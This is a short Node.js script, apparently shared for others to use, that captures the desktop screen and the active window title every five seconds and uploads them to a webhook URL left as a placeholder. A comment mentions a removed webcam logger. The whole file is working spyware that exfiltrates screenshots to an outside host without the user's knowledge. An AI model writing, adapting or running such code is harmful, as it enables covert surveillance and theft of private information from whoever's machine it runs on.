const screenshot = require('screenshot-desktop');
const activeWin = require('active-win');
const fetch = require('node-fetch');
const FormData = require('form-data');
const fs = require('fs');
const NodeWebcam = require('node-webcam'); //ignore ts, i removed webcam logger cuz we keep it safe here bois!!

const WEBHOOK_URL = 'ykwhattoputinherenoobs';

async function sendActivity() {
    const win = await activeWin();
    const title = win?.title || 'Unknown Window';

    const img = await screenshot({ format: 'png' });
    fs.writeFileSync('yokiro.png', img);

    const form = new FormData();
    form.append('content', `🖥️ **Active Window**: \`${title}\``);
    form.append('file', fs.createReadStream('yokiro.png'));

    await fetch(WEBHOOK_URL, {
        method: 'POST',
        body: form
    });

    fs.unlinkSync('yokiro.png');
}

setInterval(sendActivity, 5 * 1000); //every 5 seconds!!
